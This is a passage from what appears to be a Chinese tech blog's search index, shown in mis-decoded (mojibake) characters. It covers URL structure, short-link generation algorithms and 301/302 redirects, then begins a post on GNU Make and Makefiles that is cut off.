Locatorï¼Œç¼©å†™ï¼šURLï¼›æˆ–ç§°ç»Ÿä¸€èµ„æºå®šä½å™¨ã€å®šä½åœ°å€ã€URLåœ°å€ï¼Œä¿—ç§°ç½‘é¡µåœ°å€æˆ–ç®€ç§°ç½‘å€ï¼‰æ˜¯å› ç‰¹ç½‘ä¸Šæ ‡å‡†çš„èµ„æºçš„åœ°å€ï¼ˆAddressï¼‰ï¼Œå¦‚åŒåœ¨ç½‘ç»œä¸Šçš„é—¨ç‰Œã€‚å®ƒæœ€åˆæ˜¯ç”±è’‚å§†Â·ä¼¯çº³æ–¯-æå‘æ˜ç”¨æ¥ä½œä¸ºä¸‡ç»´ç½‘çš„åœ°å€ï¼Œç°åœ¨å®ƒå·²ç»è¢«[ä¸‡ç»´ç½‘è”ç›Ÿ4ç¼–åˆ¶ä¸ºå› ç‰¹ç½‘æ ‡å‡†RFC 1738ã€‚\nåœ¨äº’è”ç½‘çš„å†å²ä¸Šï¼Œç»Ÿä¸€èµ„æºå®šä½ç¬¦çš„å‘æ˜æ˜¯ä¸€ä¸ªéå¸¸åŸºç¡€çš„æ­¥éª¤ã€‚ç»Ÿä¸€èµ„æºå®šä½ç¬¦çš„è¯­æ³•æ˜¯ä¸€èˆ¬çš„ï¼Œå¯æ‰©å±•çš„ï¼Œå®ƒä½¿ç”¨ç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç çš„ä¸€éƒ¨åˆ†æ¥è¡¨ç¤ºå› ç‰¹ç½‘çš„åœ°å€ã€‚ç»Ÿä¸€èµ„æºå®šä½ç¬¦çš„å¼€å§‹ï¼Œä¸€èˆ¬ä¼šæ ‡å¿—ç€ä¸€ä¸ªè®¡ç®—æœºç½‘ç»œæ‰€ä½¿ç”¨çš„ç½‘ç»œåè®®ã€‚\nç»Ÿä¸€èµ„æºå®šä½ç¬¦çš„æ ‡å‡†æ ¼å¼å¦‚ä¸‹ï¼š\n[åè®®ç±»å‹]: //æœåŠ¡å™¨åœ°å€:ç«¯å£å·/èµ„æºå±‚çº§UNIXæ–‡ä»¶è·¯å¾„æ–‡ä»¶å?æŸ¥è¯¢#ç‰‡æ®µID [protocol]://server_address:port/path_and_filename?search#fragmentID ç»Ÿä¸€èµ„æºå®šä½ç¬¦çš„å®Œæ•´æ ¼å¼å¦‚ä¸‹ï¼š\n[åè®®ç±»å‹]: //è®¿é—®èµ„æºéœ€è¦çš„å‡­è¯ä¿¡æ¯@æœåŠ¡å™¨åœ°å€:ç«¯å£å·/èµ„æºå±‚çº§UNIXæ–‡ä»¶è·¯å¾„æ–‡ä»¶å?æŸ¥è¯¢#ç‰‡æ®µID å…¶ä¸­[è®¿é—®å‡­è¯ä¿¡æ¯]ã€[ç«¯å£å·]ã€[æŸ¥è¯¢]ã€[ç‰‡æ®µID]éƒ½å±äºé€‰å¡«é¡¹ã€‚\nè¯­æ³• è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆhttpï¼‰çš„ç»Ÿä¸€èµ„æºå®šä½ç¬¦å°†ä»å› ç‰¹ç½‘è·å–ä¿¡æ¯çš„äº”ä¸ªåŸºæœ¬å…ƒç´ åŒ…æ‹¬åœ¨ä¸€ä¸ªç®€å•çš„åœ°å€ä¸­ï¼š\n ä¼ é€åè®®ã€‚ å±‚çº§URLæ ‡è®°ç¬¦å·(ä¸º[//],å›ºå®šä¸å˜) è®¿é—®èµ„æºéœ€è¦çš„å‡­è¯ä¿¡æ¯ï¼ˆå¯çœç•¥ï¼‰ æœåŠ¡å™¨ã€‚ï¼ˆé€šå¸¸ä¸ºåŸŸåï¼Œæœ‰æ—¶ä¸ºIPåœ°å€ï¼‰ ç«¯å£å·ã€‚ï¼ˆä»¥æ•°å­—æ–¹å¼è¡¨ç¤ºï¼Œè‹¥ä¸ºé»˜è®¤å€¼å¯çœç•¥ï¼‰ è·¯å¾„ã€‚ï¼ˆä»¥â€œ/â€å­—ç¬¦åŒºåˆ«è·¯å¾„ä¸­çš„æ¯ä¸€ä¸ªç›®å½•åç§°ï¼‰ æŸ¥è¯¢ã€‚ï¼ˆGETæ¨¡å¼çš„çª—ä½“å‚æ•°ï¼Œä»¥â€œ?â€å­—ç¬¦ä¸ºèµ·ç‚¹ï¼Œæ¯ä¸ªå‚æ•°ä»¥â€œ\u0026â€éš”å¼€ï¼Œå†ä»¥â€œ=â€åˆ†å¼€å‚æ•°åç§°ä¸æ•°æ®ï¼Œé€šå¸¸ä»¥UTF8çš„URLç¼–ç ï¼Œé¿å¼€å­—ç¬¦å†²çªçš„é—®é¢˜ï¼‰ ç‰‡æ®µã€‚ä»¥â€œ#â€å­—ç¬¦ä¸ºèµ·ç‚¹  ä»¥http://zh.wikipedia.org:80/w/index.php?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2 ä¸ºä¾‹, å…¶ä¸­ï¼š\n httpï¼Œæ˜¯åè®®ï¼› zh.wikipedia.orgï¼Œæ˜¯æœåŠ¡å™¨ï¼› 80ï¼Œæ˜¯æœåŠ¡å™¨ä¸Šçš„ç½‘ç»œç«¯å£å·ï¼› /w/index.phpï¼Œæ˜¯è·¯å¾„ï¼› ?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2ï¼Œæ˜¯è¯¢é—®ã€‚  å¤§å¤šæ•°ç½‘é¡µæµè§ˆå™¨ä¸è¦æ±‚ç”¨æˆ·è¾“å…¥ç½‘é¡µä¸­â€œhttp://â€çš„éƒ¨åˆ†ï¼Œå› ä¸ºç»å¤§å¤šæ•°ç½‘é¡µå†…å®¹æ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®æ–‡ä»¶ã€‚åŒæ ·ï¼Œâ€œ80â€æ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®æ–‡ä»¶çš„å¸¸ç”¨ç«¯å£å·ï¼Œå› æ­¤ä¸€èˆ¬ä¹Ÿä¸å¿…å†™æ˜ã€‚ä¸€èˆ¬æ¥è¯´ç”¨æˆ·åªè¦é”®å…¥ç»Ÿä¸€èµ„æºå®šä½ç¬¦çš„ä¸€éƒ¨åˆ†ï¼ˆzh.wikipedia.org/wiki/Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2ï¼‰å°±å¯ä»¥äº†ã€‚\nç”±äºè¶…æ–‡æœ¬ä¼ è¾“åè®®å…è®¸æœåŠ¡å™¨å°†æµè§ˆå™¨é‡å®šå‘åˆ°å¦ä¸€ä¸ªç½‘é¡µåœ°å€ï¼Œå› æ­¤è®¸å¤šæœåŠ¡å™¨å…è®¸ç”¨æˆ·çœç•¥ç½‘é¡µåœ°å€ä¸­çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚ wwwã€‚ä»æŠ€æœ¯ä¸Šæ¥è¯´è¿™æ ·çœç•¥åçš„ç½‘é¡µåœ°å€å®é™…ä¸Šæ˜¯ä¸€ä¸ªä¸åŒçš„ç½‘é¡µåœ°å€ï¼Œæµè§ˆå™¨æœ¬èº«æ— æ³•å†³å®šè¿™ä¸ªæ–°åœ°å€æ˜¯å¦é€šï¼ŒæœåŠ¡å™¨å¿…é¡»å®Œæˆé‡å®šå‘çš„ä»»åŠ¡\nçŸ­é“¾æ¥ çŸ­é“¾æ¥æœ¬è´¨ä¸Šæ˜¯httpåè®®ä¸­çš„é‡å®šå‘å†…å®¹ï¼Œä¸€èˆ¬ä¸ºhttp301å’Œhttp302\nçŸ­é“¾æ¥çš„ä¼˜åŠ¿ï¼šç®€çŸ­ã€ç¾è§‚ã€ä¾¿äºä¼ æ’­\nåŸç† ä¾‹å¦‚çŸ­é“¾æ¥ http://qnr.io/j6Dcss\n DNSè§£æqnr.ioåŸŸåï¼Œå‘é€GETè¯·æ±‚ /j6Dcss æœåŠ¡å™¨ä¼šé€šè¿‡çŸ­ç è·å–å¯¹åº”çš„åŸURL ç„¶åé€šè¿‡ HTTP 302 ï¼ˆæˆ–HTTP 301ï¼‰è½¬åˆ°å¯¹åº”çš„åŸURL  å¸¸è§ç®—æ³•å®ç° è‡ªå¢åºåˆ—ç®—æ³• çŸ­å€çš„é•¿åº¦ä¸€èˆ¬è®¾ä¸º 6 ä½ï¼Œè€Œæ¯ä¸€ä½æ˜¯ç”± [a - z, A - Z, 0 - 9] æ€»å…± 62 ä¸ªå­—æ¯ç»„æˆçš„ï¼Œæ‰€ä»¥ 6 ä½çš„è¯ï¼Œæ€»å…±ä¼šæœ‰ 62^6 ~= 568äº¿ç§ç»„åˆï¼Œä¸€èˆ¬è‚¯å®šæ˜¯å¤Ÿç”¨äº†ã€‚ å°†åŸç½‘å€åˆ†é…ä¸€ä¸ªä»1ä½åˆ°6ä½çš„éšæœºçŸ­ç ï¼Œå­˜æ•°æ®åº“è®°å½•ï¼Œå¯¹è¿”å›çš„idè¿›è¡Œ62è¿›åˆ¶è½¬ç ã€‚\nå³å¯ä½¿ç”¨å‘å·ç­–ç•¥ã€‚å‘å·ç­–ç•¥æ˜¯è¿™æ ·çš„ï¼Œå½“ä¸€ä¸ªæ–°çš„é“¾æ¥è¿‡æ¥æ—¶ï¼Œå‘å·å™¨å‘ä¸€ä¸ªå·ä¸ä¹‹å¯¹åº”ã€‚å¾€ååªè¦æœ‰æ–°é“¾æ¥è¿‡æ¥ï¼Œå‘å·å™¨ä¸åœå‘å·å°±å¥½ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œç¬¬ä¸€ä¸ªè¿›æ¥çš„é“¾æ¥å‘å·å™¨å‘0å·ï¼Œå¯¹åº”çš„çŸ­é“¾æ¥ä¸º xx.xxx/0ï¼Œç¬¬äºŒä¸ªè¿›æ¥çš„é“¾æ¥å‘å·å™¨å‘1å·ï¼Œå¯¹åº”çš„çŸ­é“¾æ¥ä¸º xx.xxx/1ï¼Œä»¥æ­¤ç±»æ¨ã€‚ å‘å·å™¨å‘å‡ºçš„10è¿›åˆ¶å·éœ€è¦è½¬æ¢æˆ62è¿›åˆ¶ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§ç¼©çŸ­å·ç è½¬æ¢æˆå­—ç¬¦ä¸²åçš„é•¿åº¦ã€‚æ¯”å¦‚å‘å·å™¨å‘å‡º 10,000,000,000 è¿™ä¸ªå·ç ï¼Œå¦‚æœä¸è½¬æ¢æˆ62è¿›åˆ¶ï¼Œç›´æ¥æ‹¼æ¥åœ¨åŸŸååé¢ï¼Œå¾—åˆ°è¿™æ ·ä¸€ä¸ªé“¾æ¥ xx.xxx/10000000000ã€‚å°†ä¸Šé¢çš„å·ç è½¬æ¢æˆ62è¿›åˆ¶ï¼Œç»“æœä¸ºAOYKUaï¼Œé•¿åº¦åªæœ‰6ä½ï¼Œæ‹¼æ¥å¾—åˆ°çš„é“¾æ¥ä¸º xx.xxx/AOYKUaã€‚å¯ä»¥çœ‹å¾—å‡ºï¼Œè¿›åˆ¶è½¬æ¢åå¾—åˆ°çš„çŸ­é“¾æ¥é•¿åº¦å˜çŸ­äº†ä¸€äº›ã€‚6ä½62è¿›åˆ¶æ•°ï¼Œå¯¹åº”çš„å·ç ç©ºé—´ä¸º626ï¼Œçº¦ç­‰äº568äº¿ã€‚ä¹Ÿå°±æ˜¯è¯´å‘å·å™¨å¯ä»¥å‘568äº¿ä¸ªå·ï¼Œè¿™ä¸ªå·ç ç©ºé—´åº”è¯¥èƒ½å¤Ÿæ»¡è¶³å¤šæ•°é¡¹ç›®çš„éœ€æ±‚äº†ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šä¸ç”¨æ‹…å¿ƒå‘å·å™¨æ— å·å¯å‘çš„æƒ…å†µã€‚ä¸Šè¿°æ˜¯å‘å·ç­–ç•¥å‹ç¼©URLçš„åŸç†ï¼Œåœ¨å®é™…å†™ä»£ç çš„è¿‡ç¨‹ä¸­è¿˜éœ€è¦è€ƒè™‘å¾ˆå¤šç»†èŠ‚ï¼Œæ¯”å¦‚ç¼“å­˜ï¼Œå­˜å‚¨ç­‰ã€‚\næ‘˜è¦ç®—æ³• å°†åŸç½‘å€ md5 ç”Ÿæˆ 32 ä½ç­¾åä¸²,åˆ†ä¸º 4 æ®µ, æ¯æ®µ 8 ä¸ªå­—èŠ‚ å¯¹è¿™å››æ®µå¾ªç¯å¤„ç†, å– 8 ä¸ªå­—èŠ‚, å°†ä»–çœ‹æˆ 16 è¿›åˆ¶ä¸²ä¸0x3fffffff(30ä½1) ä¸æ“ä½œ, å³è¶…è¿‡ 30 ä½çš„å¿½ç•¥å¤„ç† è¿™ 30 ä½åˆ†æˆ 6 æ®µ, æ¯ 5ä½çš„æ•°å­—ä½œä¸ºå­—æ¯è¡¨çš„ç´¢å¼•å–å¾—ç‰¹å®šå­—ç¬¦, ä¾æ¬¡è¿›è¡Œè·å¾— 6 ä½å­—ç¬¦ä¸² æ€»çš„ md5 ä¸²å¯ä»¥è·å¾— 4 ä¸ª 6ä½ä¸²,å–é‡Œé¢çš„ä»»æ„ä¸€ä¸ªå°±å¯ä½œä¸ºè¿™ä¸ªé•¿ url çš„çŸ­ url åœ°å€ è¿™ç§ç®—æ³•,è™½ç„¶ä¼šç”Ÿæˆ4ä¸ª,ä½†æ˜¯ä»ç„¶å­˜åœ¨é‡å¤å‡ ç‡\nç®—æ³•æ¯”è¾ƒ ç¬¬ä¸€ç§ç®—æ³•çš„å¥½å¤„å°±æ˜¯ç®€å•å¥½ç†è§£ï¼Œæ°¸ä¸é‡å¤ã€‚ä½†æ˜¯çŸ­ç çš„é•¿åº¦ä¸å›ºå®šï¼Œéšç€ id å˜å¤§ä»ä¸€ä½é•¿åº¦å¼€å§‹é€’å¢ã€‚å¦‚æœéè¦è®©çŸ­ç é•¿åº¦å›ºå®šä¹Ÿå¯ä»¥å°±æ˜¯è®© id ä»æŒ‡å®šçš„æ•°å­—å¼€å§‹é€’å¢å°±å¯ä»¥äº†ã€‚\nç¬¬äºŒç§ç®—æ³•ï¼Œè™½ç„¶å‡ ç‡å¾ˆå°ï¼Œä½†æ˜¯å­˜åœ¨ç¢°æ’ï¼ˆé‡å¤ï¼‰çš„å¯èƒ½æ€§ã€‚çŸ­ç ä½æ•°æ˜¯æ¯”è¾ƒå›ºå®šçš„ã€‚\nQï¼šåŒä¸€é•¿é“¾æ¥ï¼Œæ¯æ¬¡è½¬æˆçš„çŸ­é“¾æ¥æ˜¯å¦ä¸€æ · Aï¼šåŒä¸€é•¿é“¾æ¥ï¼Œæ¯æ¬¡è½¬æˆçš„çŸ­é“¾æ¥ä¸ä¸€å®šä¸€æ ·ï¼ŒåŸå› åœ¨äºå¦‚æœæŸ¥è¯¢ç¼“å­˜æ—¶ï¼Œå¦‚æœæœªå‘½ä¸­ï¼Œå‘å·å™¨ä¼šå‘æ–°å·ç»™è¿™ä¸ªé“¾æ¥ã€‚éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œç¼“å­˜åº”è¯¥ç¼“å­˜ç»å¸¸è½¬æ¢çš„çƒ­é—¨é“¾æ¥ï¼Œå‡è®¾è®¾å®šç¼“å­˜è¿‡æœŸæ—¶é—´ä¸ºä¸€å°æ—¶ï¼Œå¦‚æœæŸä¸ªé“¾æ¥å¾ˆæ´»è·ƒçš„è¯ï¼Œç¼“å­˜æŸ¥è¯¢å‘½ä¸­åï¼Œç¼“å­˜ä¼šåˆ·æ–°è¿™ä¸ªé“¾æ¥çš„å­˜æ´»æ—¶é—´ï¼Œé‡æ–°è®¡æ—¶ï¼Œè¿™ä¸ªé“¾æ¥å°±ä¼šé•¿ä¹…å­˜åœ¨ç¼“å­˜ä¸­ã€‚å¯¹äºä¸€äº›ç”Ÿåƒ»é“¾æ¥ï¼Œä»å­˜å…¥ç¼“å­˜å¼€å§‹ï¼Œåœ¨å­˜æ´»æ—¶é—´å†…å¾ˆå¯èƒ½ä¸ä¼šè¢«å†æ¬¡è®¿é—®ï¼Œå­˜æ´»æ—¶é—´ç»“æŸç¼“å­˜ä¼šåˆ é™¤è®°å½•ã€‚ä¸‹ä¸€æ¬¡è½¬æ¢è¿™ä¸ªç”Ÿåƒ»é“¾æ¥ï¼Œç¼“å­˜ä¸å‘½ä¸­ï¼Œå‘å·å™¨ä¼šé‡æ–°å‘å·ã€‚è¿™æ ·ä¸€æ¥ä¼šå¯¼è‡´ä¸€æ¡é•¿é“¾æ¥å¯¹åº”å¤šæ¡çŸ­é“¾æ¥çš„æƒ…å†µå‡ºç°ï¼Œä¸ä»…æµªè´¹å­˜å‚¨ç©ºé—´ï¼Œåˆæµªè´¹å‘å·å™¨èµ„æºã€‚é‚£ä¹ˆæ˜¯å¦æœ‰åŠæ³•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿæ˜¯ä¸æ˜¯å¯ä»¥è€ƒè™‘å»ºç«‹ä¸€ä¸ªé•¿é“¾æ¥-çŸ­é“¾æ¥çš„key-valueè¡¨ï¼Œå°†æ‰€æœ‰çš„é•¿é“¾æ¥å’Œå¯¹åº”çš„çŸ­é“¾æ¥éƒ½å­˜å…¥å…¶ä¸­ï¼Œè¿™æ ·ä¸€æ¥å°±å®ç°äº†é•¿çŸ­é“¾æ¥ä¸€ä¸€å¯¹åº”çš„äº†ã€‚ä½†æ˜¯æƒ³æ³•æ˜¯ç¾å¥½çš„ï¼Œç°å®æ˜¯ä¸è¡Œçš„ï¼ŒåŸå› åœ¨äºï¼Œå°†æ‰€æœ‰çš„é•¿é“¾æ¥-çŸ­é“¾æ¥å¯¹å­˜å…¥è¿™æ ·çš„è¡¨ä¸­ï¼Œæœ¬èº«å°±éœ€è¦è€—è´¹å¤§é‡çš„å­˜å‚¨ç©ºé—´ï¼Œç›¸å¯¹äºç”Ÿåƒ»é“¾æ¥å¯èƒ½ä¼šå¯¹åº”å¤šæ¡çŸ­é“¾æ¥æµªè´¹çš„é‚£ç‚¹ç©ºé—´ï¼Œè¿™æ ·åšæ˜¾ç„¶å°±å¾—ä¸å¿å¤±äº†ã€‚\nHTTP 301ä¸ 302çš„åŒºåˆ« 301 æ˜¯æ°¸ä¹…é‡å®šå‘ï¼Œ302 æ˜¯ä¸´æ—¶é‡å®šå‘ã€‚çŸ­åœ°å€ä¸€ç»ç”Ÿæˆå°±ä¸ä¼šå˜åŒ–ï¼Œæ‰€ä»¥ç”¨ 301 æ˜¯ç¬¦åˆ http è¯­ä¹‰çš„ã€‚åŒæ—¶å¯¹æœåŠ¡å™¨å‹åŠ›ä¹Ÿä¼šæœ‰ä¸€å®šå‡å°‘ã€‚ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®æŸä¸ªçŸ­é“¾æ¥åï¼Œå¦‚æœæœåŠ¡å™¨è¿”å›301çŠ¶æ€ç ï¼Œåˆ™è¿™ä¸ªç”¨æˆ·åœ¨åç»­å¤šæ¬¡è®¿é—®ç»Ÿä¸€çŸ­é“¾æ¥ï¼Œæµè§ˆå™¨ä¼šç›´æ¥è¯·æ±‚è·³è½¬åœ°å€ï¼Œè€Œä¸æ˜¯çŸ­é“¾æ¥åœ°å€ï¼Œè¿™æ ·ä¸€æ¥æœåŠ¡å™¨ç«¯å°±æ— æ³•æ”¶åˆ°ç”¨æˆ·çš„è¯·æ±‚ã€‚å¦‚æœæœåŠ¡å™¨è¿”å›302çŠ¶æ€ç ï¼Œä¸”å‘ŠçŸ¥æµè§ˆå™¨ä¸ç¼“å­˜çŸ­é“¾æ¥è¯·æ±‚ï¼Œé‚£ä¹ˆç”¨æˆ·æ¯æ¬¡è®¿é—®çŸ­é“¾æ¥ï¼Œéƒ½ä¼šå…ˆå»çŸ­é“¾æ¥æœåŠ¡ç«¯å–å›é•¿é“¾æ¥åœ°å€ï¼Œç„¶ååœ¨è·³è½¬ã€‚ä»è¯­ä¹‰ä¸Šæ¥è¯´ï¼Œ301è·³è½¬æ›´ä¸ºåˆé€‚ï¼Œå› ä¸ºæ˜¯æ°¸ä¹…è·³è½¬ï¼Œä¸ä¼šæ¯æ¬¡éƒ½è®¿é—®æœåŠ¡ç«¯ï¼Œè¿˜å¯ä»¥å‡å°æœåŠ¡ç«¯å‹åŠ›ã€‚ä½†å¦‚æœä½¿ç”¨301è·³è½¬ï¼ŒæœåŠ¡ç«¯å°±æ— æ³•ç²¾ç¡®æœé›†ç”¨æˆ·çš„è®¿é—®è¡Œä¸ºäº†ã€‚ç›¸å302è·³è½¬ä¼šå¯¼è‡´æœåŠ¡ç«¯å‹åŠ›å¢å¤§ï¼Œä½†æœåŠ¡ç«¯æ­¤æ—¶å°±å¯ç²¾ç¡®æœé›†ç”¨æˆ·çš„è®¿é—®è¡Œä¸ºã€‚ ä½†æ˜¯å¦‚æœä½¿ç”¨äº† 301ï¼Œæˆ‘ä»¬å°±æ— æ³•ç»Ÿè®¡åˆ°çŸ­åœ°å€è¢«ç‚¹å‡»çš„æ¬¡æ•°äº†ã€‚è€Œç‚¹æ”¶é›†å‡»æ¬¡æ•°çš„æ„ä¹‰é‚£å°±ä¸è¨€è€Œå–»äº†ï¼Œå…³é”®æ˜¯ç°åœ¨æœåŠ¡å™¨ç¡¬ä»¶è®¾å¤‡éƒ½å¾ˆå¥½ï¼Œè¿˜æœ‰æ”¯æŒé«˜å¹¶å‘çš„NGINXï¼Œæ‰€ä»¥å¯¹æœåŠ¡å™¨çš„å‹åŠ›å‡ ä¹å¯ä»¥å¿½ç•¥ï¼Œæœ€ç»ˆä¹Ÿå°±é€‰æ‹©302ã€‚\n","description":"","tags":["url","tech"],"title":"url","uri":"/posts/url/"},{"categories":["c++"],"content":"Make  æœ¬æ–‡å‚è€ƒï¼š\nGNU+makeä¸­æ–‡æ‰‹å†Œ\nGNU+makeåŸç‰ˆå®˜æ–¹æ‰‹å†Œ\nmake wiki\nMakefileç”±æµ…å…¥æ·±\nè·Ÿæˆ‘ä¸€èµ·å†™Makefile\n åº â€‹\tæœ€åˆäº†è§£åˆ°Makefileï¼Œè¿˜æ˜¯ä»å¾ˆä¹…å¾ˆä¹…ä»¥å‰è¯´èµ·ã€‚å½“æ—¶åœ¨è€å¸ˆåº•ä¸‹åšé¡¹ç›®ï¼Œè¦é…ç½®ä¸€ä¸ªnginxæœåŠ¡å™¨ï¼Œå½“åˆç»™å‡ºæ•™ç¨‹æ˜¯ç›´æ¥make\u0026\u0026make installå°±å®Œäº‹äº†ï¼Œæ‰“å®Œä»£ç ä¸€è¡Œè¡Œæ‰§è¡Œä¸‹æ¥çœ‹èµ·æ¥éå¸¸æœ‰æˆå°±æ„Ÿ233333\nâ€‹\tä½†æ˜¯ä¹‹ååœ¨åšè®¡ç®—æœºç³»ç»Ÿçš„å®éªŒæ—¶ï¼Œæ‰å‘ç°Makefileæ˜¯å¦‚æ­¤çš„æœ‰ç”¨ä¸‡èƒ½ï¼Œæ— è®ºæ˜¯windowsè¿˜æ˜¯linux(ubuntu 16.04)ä¸‹ï¼Œåªéœ€è¦ä¸€ä¸ªmakeå°±èƒ½è§£å†³ç¼–è¯‘é“¾æ¥å®‰è£…é—®é¢˜ï¼Œmakeå®Œå°±èƒ½ç«‹å³ä½¿ç”¨ï¼Œå®å±å¥½ç”¨ã€‚åœ¨ä¹‹åçš„æ“ä½œç³»ç»Ÿå®éªŒä¸­ï¼ŒçœŸæ­£æ¥è§¦åˆ°äº†Makefileè¿™ä¸œè¥¿ï¼ŒåŸºæœ¬æ¯ä¸ªå®éªŒéƒ½è¦å†™Makefileï¼Œå› æ­¤å¯¹Makefileçš„æ ¼å¼æœ‰äº†ä¸€ä¸ªå¤§æ¦‚å°è±¡ï¼Œä½†ä¸è¿‡æƒ³æ·±å…¥äº†è§£ä¸€æ³¢ï¼Œä¾¿å»æ‰¾äº†è®¸å¤šèµ„æ–™çœ‹ã€‚\næ¦‚è¿° åœ¨è½¯ä»¶å¼€å‘ä¸­ï¼Œmakeæ˜¯ä¸€ä¸ªå·¥å…·ç¨‹åºï¼ˆUtility softwareï¼‰ï¼Œç»ç”±è¯»å–å«åšâ€œmakefileâ€çš„æ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ–å»ºæ„è½¯ä»¶ã€‚å®ƒæ˜¯ä¸€ç§è½¬åŒ–æ–‡ä»¶å½¢å¼çš„å·¥å…·ï¼Œè½¬æ¢çš„ç›®æ ‡ç§°ä¸ºâ€œtargetâ€ï¼›ä¸æ­¤åŒæ—¶ï¼Œå®ƒä¹Ÿæ£€æŸ¥æ–‡ä»¶çš„ä¾èµ–å…³ç³»ï¼Œå¦‚æœéœ€è¦çš„è¯ï¼Œå®ƒä¼šè°ƒç”¨ä¸€äº›å¤–éƒ¨è½¯ä»¶æ¥å®Œæˆä»»åŠ¡ã€‚å®ƒçš„ä¾èµ–å…³ç³»æ£€æŸ¥ç³»ç»Ÿéå¸¸ç®€å•ï¼Œä¸»è¦æ ¹æ®ä¾èµ–æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´è¿›è¡Œåˆ¤æ–­ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒè¢«ç”¨æ¥ç¼–è¯‘æºä»£ç ï¼Œç”Ÿæˆç»“æœä»£ç ï¼Œç„¶åæŠŠç»“æœä»£ç è¿æ¥èµ·æ¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶æˆ–è€…åº“æ–‡ä»¶ã€‚å®ƒä½¿ç”¨å«åšâ€œmakefileâ€çš„æ–‡ä»¶æ¥ç¡®å®šä¸€ä¸ªtargetæ–‡ä»¶çš„ä¾èµ–å…³ç³»ï¼Œç„¶åæŠŠç”Ÿæˆè¿™ä¸ªtargetçš„ç›¸å…³å‘½ä»¤ä¼ ç»™shellå»æ‰§è¡Œã€‚\nè®¸å¤šç°ä»£è½¯ä»¶çš„å¼€å‘ä¸­ï¼ˆå¦‚Microsoft Visual Studioï¼ˆä»–å…¶å®æœ‰æä¾›ä¸€ä¸ªvs 2017 äº¤å‰å·¥å…·å‘½ä»¤æç¤ºç¬¦ï¼Œå¯ä»¥è¿›è¡Œmakeï¼Œä½†ä¸è¿‡ä¸€èˆ¬åœ¨IDEä¸­ç›´æ¥ç¼–è¯‘ç”Ÿæˆç‹¬æœ‰çš„å·¥ç¨‹é…ç½®æ–‡ä»¶ï¼‰ï¼‰ï¼Œé›†æˆå¼€å‘ç¯å¢ƒå·²ç»å–ä»£makeï¼Œä½†æ˜¯åœ¨Unixç¯å¢ƒä¸­ï¼Œä»ç„¶æœ‰è®¸å¤šä»»åŠ¡ç¨‹å¸ˆé‡‡ç”¨makeæ¥ååŠ©è½¯ä»¶å¼€å‘ã€‚\nMakefileä»‹ç» makeå‘½ä»¤æ‰§è¡Œæ—¶ï¼Œéœ€è¦ä¸€ä¸ªmakefileæ–‡ä»¶ï¼Œä»¥å‘Šè¯‰makeå‘½ä»¤éœ€è¦æ€ä¹ˆæ ·çš„å»ç¼–è¯‘å’Œé“¾æ¥ç¨‹åºã€‚\né¦–å…ˆï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªç¤ºä¾‹æ¥è¯´æ˜makefileçš„ä¹¦å†™è§„åˆ™ï¼Œä»¥ä¾¿ç»™å¤§å®¶ä¸€ä¸ªæ„Ÿæ€§è®¤è¯†ã€‚è¿™ä¸ªç¤ºä¾‹æ¥æºäºgnu çš„makeä½¿ç”¨æ‰‹å†Œï¼Œåœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬çš„å·¥ç¨‹æœ‰8ä¸ªcæ–‡ä»¶ï¼Œå’Œ3ä¸ªå¤´æ–‡ä»¶ï¼Œæˆ‘ä»¬è¦å†™ä¸€ä¸ªmakefileæ¥å‘Š è¯‰makeå‘½ä»¤å¦‚ä½•ç¼–è¯‘å’Œé“¾æ¥è¿™å‡ ä¸ªæ–‡ä»¶ã€‚æˆ‘ä»¬çš„è§„åˆ™æ˜¯ï¼š\n å¦‚æœè¿™ä¸ªå·¥ç¨‹æ²¡æœ‰ç¼–è¯‘è¿‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æ‰€æœ‰cæ–‡ä»¶éƒ½è¦ç¼–è¯‘å¹¶è¢«é“¾æ¥ã€‚ å¦‚æœè¿™ä¸ªå·¥ç¨‹çš„æŸå‡ ä¸ªcæ–‡ä»¶è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªç¼–è¯‘è¢«ä¿®æ”¹çš„cæ–‡ä»¶ï¼Œå¹¶é“¾æ¥ç›®æ ‡ç¨‹åºã€‚ å¦‚æœè¿™ä¸ªå·¥ç¨‹çš„å¤´æ–‡ä»¶è¢«æ”¹å˜äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦ç¼–è¯‘å¼•ç”¨äº†è¿™å‡ ä¸ªå¤´æ–‡ä»¶çš„cæ–‡ä»¶ï¼Œå¹¶é“¾æ¥ç›®æ ‡ç¨‹åºã€‚  åªè¦æˆ‘ä»¬çš„makefileå†™å¾—å¤Ÿå¥½ï¼Œæ‰€æœ‰çš„è¿™ä¸€åˆ‡ï¼Œæˆ‘ä»¬åªç”¨ä¸€ä¸ªmakeå‘½ä»¤å°±å¯ä»¥å®Œæˆï¼Œmakeå‘½ä»¤ä¼šè‡ªåŠ¨æ™ºèƒ½ åœ°æ ¹æ®å½“å‰çš„æ–‡ä»¶ä¿®æ”¹çš„æƒ…å†µæ¥ç¡®å®šå“ªäº›æ–‡ä»¶éœ€è¦é‡ç¼–è¯‘ï¼Œä»è€Œè‡ªåŠ¨ç¼–è¯‘æ‰€éœ€è¦çš„æ–‡ä»¶å’Œé“¾æ¥ç›®æ ‡ç¨‹åºã€‚\nMakefileè§„åˆ™ 1 2 3 4 5 6 7 8  #Makefileä¸­ï¼Œç”¨#è¡¨ç¤ºæ³¨é‡Š target 